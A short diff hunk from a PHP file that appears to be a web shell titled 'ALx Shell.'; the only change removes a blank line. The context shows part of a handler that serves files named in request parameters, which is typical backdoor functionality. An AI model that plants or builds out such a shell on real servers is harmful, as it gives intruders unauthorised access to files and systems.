@@ -275,7 +275,6 @@ if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')
     exit;
 }
 ?>
-
 <html>
 <head>
 <title>ALx Shell.</title>
